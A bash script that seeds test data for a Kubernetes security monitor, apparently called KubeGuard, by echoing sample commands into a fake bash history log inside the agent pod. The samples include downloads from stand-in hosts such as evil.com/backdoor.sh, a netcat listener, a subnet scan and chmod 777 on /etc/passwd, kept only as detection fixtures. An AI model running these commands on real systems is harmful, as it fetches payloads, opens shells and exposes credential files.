#!/bin/bash

# KubeGuard Test Data Generator
# Injects sample commands to test the security monitoring

echo "🧪 Generating test data for KubeGuard..."

# Find the agent pod
AGENT_POD=$(kubectl get pods -l app=kubeguard-agent -o jsonpath='{.items[0].metadata.name}' 2>/dev/null)

if [ -z "$AGENT_POD" ]; then
    echo "❌ No KubeGuard Agent pod found. Make sure it's deployed first."
    echo "Run: ./deploy.sh"
    exit 1
fi

echo "📡 Found agent pod: $AGENT_POD"
echo "📝 Injecting sample commands..."

# Generate various test commands
commands=(
    "curl http://malicious-site.com/payload"
    "nmap -sS 192.168.1.0/24"
    "wget http://evil.com/backdoor.sh"
    "nc -l -p 4444"
    "chmod 777 /etc/passwd"
    "base64 -d <<< 'ZWNobyBoZWxsbw=='"
    "ls -la /home"
    "ps aux"
    "df -h"
    "netstat -tulpn"
)

for cmd in "${commands[@]}"; do
    echo "  → $cmd"
    kubectl exec -it "$AGENT_POD" -- sh -c "echo '$cmd' >> /tmp/fake_bash_history.log"
    sleep 1
done

echo ""
echo "✅ Test data generated successfully!"
echo "🎨 Check your dashboard at http://localhost:5173 to see the results"
echo "⚠️  High-risk commands should appear with red alerts"